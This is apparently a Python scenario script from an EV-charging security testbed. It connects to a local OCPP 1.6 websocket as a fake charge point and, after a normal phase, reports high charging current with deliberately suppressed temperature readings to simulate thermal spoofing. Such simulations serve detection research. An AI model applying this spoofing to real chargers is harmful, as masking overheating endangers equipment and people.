import asyncio
import logging
import random
import websockets
import time
from src.core.scenario_adapter import ScenarioAdapter

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

CP_ID = "CP_KADIR_CAN"
WS_URL = f"ws://127.0.0.1:9000/{CP_ID}"

async def run_attack(adapter: ScenarioAdapter):
    logger.info(f"🚨 [KADIR_CAN] TERMAL MANIPULASYON SALDIRISI BAŞLATILIYOR")
    
    try:
        async with websockets.connect(WS_URL, subprotocols=["ocpp1.6"]) as ws:
            # Boot
            adapter.emit("BootNotification", {"model": "ThermalMaster-2000", "vendor": "KadirSec"})
            await asyncio.sleep(1)
            
            # Start session
            id_tag = "ADMIN_TAG_999"
            tx_id = int(time.time())
            adapter.emit("StartTransaction", {"idTag": id_tag, "transactionId": tx_id})
            await asyncio.sleep(1)
            
            # PHASE 1: Normal Durum (Akım orta, sıcaklık normal)
            logger.info("⚡ Normal şarj fazı...")
            for i in range(3):
                current = 10.0 + random.uniform(-1, 1)
                temp = 35.0 + i * 2
                adapter.emit("MeterValues", {
                    "transactionId": tx_id,
                    "meterValue": [
                        {"sampledValue": [{"value": str(current), "measurand": "Current.Import"}]},
                        {"sampledValue": [{"value": str(temp), "measurand": "Temperature"}]}
                    ]
                })
                await asyncio.sleep(1)
                
            # PHASE 2: SALDIRI (Akım çok yüksek, ama sıcaklık düşük raporlanıyor - SPOOFING)
            logger.error("🔥 SALDIRI AKTİF: Thermal Spoofing/Manipulation!")
            for i in range(5):
                # Kritik akım (>20A) ama düşük sıcaklık (<40C)
                high_current = 25.0 + random.uniform(0, 5)
                spoofed_temp = 32.0 + random.uniform(-2, 2)
                
                logger.warning(f"  > Raporlanan: {high_current}A, {spoofed_temp}°C (Sıcaklık baskılanmış!)")
                
                adapter.emit("MeterValues", {
                    "transactionId": tx_id,
                    "meterValue": [
                        {"sampledValue": [{"value": str(high_current), "measurand": "Current.Import"}]},
                        {"sampledValue": [{"value": str(spoofed_temp), "measurand": "Temperature"}]}
                    ]
                })
                await asyncio.sleep(1)
            
            # Stop session
            adapter.emit("StopTransaction", {"transactionId": tx_id, "reason": "Local"})
            logger.info("🚨 [KADIR_CAN] SENARYO TAMAMLANDI")
            
    except Exception as e:
        logger.error(f"❌ Bağlantı hatası: {e}")

def run_scenario(mode: str = "attack", adapter: ScenarioAdapter = None):
    if mode == "attack":
        asyncio.run(run_attack(adapter))
    else:
        logger.info("Normal mod bu senaryo için tasarlanmadı.")

if __name__ == "__main__":
    from src.core.scenario_adapter import ScenarioAdapter
    adapter = ScenarioAdapter(CP_ID, "kadir_can_injection")
    run_scenario("attack", adapter)
